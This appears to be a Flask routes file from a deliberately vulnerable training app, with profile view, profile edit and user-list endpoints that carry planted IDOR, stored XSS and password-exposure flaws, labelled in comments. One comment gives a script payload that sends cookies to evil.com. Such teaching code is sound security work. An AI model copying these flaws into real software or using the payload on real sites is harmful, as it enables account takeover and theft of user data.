# VulnNet Profile Routes
# INTENTIONALLY INSECURE - For educational purposes only

from flask import Blueprint, request, render_template, redirect, url_for, session
import database
from routes.auth import get_current_user, login_required

profile_bp = Blueprint("profile", __name__)


@profile_bp.route("/profile")
def view_profile():
    """
    VULNERABLE: IDOR (Insecure Direct Object Reference)
    Anyone can view any profile by changing the id parameter
    Exploit: /profile?id=1, /profile?id=2, etc.
    """
    # VULNERABILITY: No access control - any user can view any profile
    user_id = request.args.get("id")

    if not user_id:
        current_user = get_current_user()
        if current_user:
            user_id = current_user["id"]
        else:
            return redirect(url_for("auth.login"))

    try:
        user_id = int(user_id)
    except ValueError:
        return "Invalid user ID", 400

    users = database.get_user_by_id(user_id)
    if not users:
        return "User not found", 404

    user = dict(users[0])

    # Get user's posts
    # Get user's posts with full details and counts
    posts = database.execute_query(
        """
        SELECT posts.*, users.username, users.profile_pic, users.role,
               (SELECT COUNT(*) FROM likes WHERE likes.post_id = posts.id) as like_count,
               (SELECT COUNT(*) FROM comments WHERE comments.post_id = posts.id) as comment_count,
               (SELECT COUNT(*) FROM retweets WHERE retweets.post_id = posts.id) as retweet_count
        FROM posts
        JOIN users ON posts.user_id = users.id
        WHERE posts.user_id = ?
        ORDER BY posts.created_at DESC
        """,
        (user_id,),
    )

    # Get posts retweeted by this user
    retweets = database.get_posts_retweeted_by_user(user_id)

    current_user = get_current_user()

    # Get user's replies with privacy check
    viewer_id = current_user["id"] if current_user else None
    replies = database.get_user_replies(user_id, viewer_id)

    # Get posts liked by this user with privacy check
    liked_posts_list = database.get_posts_liked_by_user(user_id, viewer_id)

    # Get follower/following counts
    follower_count = database.get_follower_count(user_id)
    following_count = database.get_following_count(user_id)

    # Determine follow state
    is_following = False
    has_pending_request = False
    if current_user and str(current_user["id"]) != str(user_id):
        is_following = database.is_following(current_user["id"], user_id)
        has_pending_request = database.has_pending_request(current_user["id"], user_id)

    # Get current user's interaction states
    liked_posts = set()
    retweeted_posts = set()
    if current_user:
        liked_posts = database.get_user_liked_posts(current_user["id"])
        retweeted_posts = database.get_user_retweeted_posts(current_user["id"])

    # VULNERABILITY: Bio field rendered without escaping (XSS)
    return render_template(
        "profile.html",
        user=user,
        posts=posts,
        retweets=retweets,
        replies=replies,
        liked_posts_list=liked_posts_list,
        current_user=current_user,
        is_own_profile=current_user and str(current_user["id"]) == str(user_id),
        follower_count=follower_count,
        following_count=following_count,
        is_following=is_following,
        has_pending_request=has_pending_request,
        liked_posts=liked_posts,
        retweeted_posts=retweeted_posts,
    )


@profile_bp.route("/profile/edit", methods=["GET", "POST"])
def edit_profile():
    """
    VULNERABLE: No access control on profile edits
    Exploit: POST to /profile/edit with user_id of another user
    """
    current_user = get_current_user()

    if request.method == "POST":
        # VULNERABILITY: user_id from form, not session (IDOR)
        user_id = request.form.get(
            "user_id", current_user["id"] if current_user else None
        )
        bio = request.form.get("bio", "")
        is_private = request.form.get("is_private") == "1"

        # VULNERABILITY: Bio not sanitized - Stored XSS
        # Exploit: bio = <script>document.location='http://evil.com/?c='+document.cookie</script>
        database.update_user_profile(user_id, bio)

        # Update privacy setting
        database.update_user_privacy(user_id, is_private)

        return redirect(url_for("profile.view_profile", id=user_id))

    if not current_user:
        return redirect(url_for("auth.login"))

    return render_template(
        "edit_profile.html", user=current_user, current_user=current_user
    )


@profile_bp.route("/users")
def list_users():
    """
    VULNERABLE: Excessive data exposure
    Returns all user data including passwords
    """
    users = database.get_all_users()
    current_user = get_current_user()
    return render_template("users.html", users=users, current_user=current_user)
